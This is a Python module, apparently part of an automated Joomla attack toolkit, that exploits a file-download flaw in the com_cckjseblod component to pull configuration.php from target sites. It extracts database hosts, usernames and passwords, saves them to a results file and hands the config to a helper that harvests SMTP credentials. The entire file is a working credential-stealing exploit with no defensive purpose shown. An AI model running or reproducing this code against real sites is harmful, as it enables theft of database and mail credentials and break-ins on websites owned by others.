# coding=utf-8
import requests, re
import printModule
import getSMTP


Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'


def Exploit(site):
    try:
        Exp = 'http://' + site + '/index.php?option=com_cckjseblod&task=download&file=configuration.php'
        GetConfig = requests.get(Exp, timeout=10, headers=Headers)
        if 'JConfig' in str(GetConfig.content):
            with open('result/Config_results.txt', 'a') as ww:
                ww.write('Full Config Path  : ' + Exp + '\n')
            try:
                Gethost = re.findall("host = '(.*)';", str(GetConfig.content))
                Getuser = re.findall("user = '(.*)';", str(GetConfig.content))
                Getpass = re.findall("password = '(.*)';", str(GetConfig.content))
                Getdb = re.findall("db = '(.*)';", str(GetConfig.content))
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write(' Host:  ' + Gethost[1] + '\n' + ' user:  ' + Getuser[1] +
                             '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                 0] + '\n---------------------\n')
                getSMTP.GETSmtpJoomConf(str(GetConfig.content))
            except:
                return printModule.returnYes(site, 'N/A', 'Com_CCkJseblod', 'Joomla')
            return printModule.returnYes(site, 'N/A', 'Com_CCkJseblod', 'Joomla')

        else:
            return printModule.returnNo(site, 'N/A', 'Com_CCkJseblod', 'Joomla')
    except:
        return printModule.returnNo(site, 'N/A', 'Com_CCkJseblod', 'Joomla')
